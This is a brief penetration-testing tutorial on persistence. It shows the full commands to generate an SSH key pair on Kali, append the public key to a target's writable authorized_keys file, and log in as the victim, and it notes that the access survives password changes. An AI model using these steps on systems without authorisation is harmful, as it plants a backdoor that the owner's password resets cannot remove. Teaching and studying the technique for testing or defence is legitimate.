Gaining Persistent SSH Access

If the ~/.ssh/authorized_keys file is writable by your low-privileged user, you can append your own public key to it, granting you direct SSH access.

1Generate New Key Pair (Kali)

Use ssh-keygen -t rsa -f ~/.ssh/my_new_key to create a new private/public key pair.

2Get Your Public Key

Display your public key using cat ~/.ssh/my_new_key.pub.

3Append to authorized_keys (Target)

On the target, use echo "your_public_key" >> ~/.ssh/authorized_keys.

4SSH into Target

From Kali, use ssh -i ~/.ssh/my_new_key victim_user@target_ip.

Key Takeaway

Manipulating authorized_keys is a powerful technique for both initial access and establishing persistence on a compromised system.

Code Walkthrough: Adding Your Public Key
# On your Kali machine:
ssh-keygen -t rsa -f ~/.ssh/my_new_key
cat ~/.ssh/my_new_key.pub
# Example public key output:
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... user@kali

# On target, if ~/.ssh/authorized_keys is writable:
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... user@kali" >> ~/.ssh/authorized_keys

# From Kali, log in:
ssh -i ~/.ssh/my_new_key victim_user@target_ip
Pro-Tip

This method is excellent for maintaining access even if the victim changes their password, as it relies on your key, not their password.
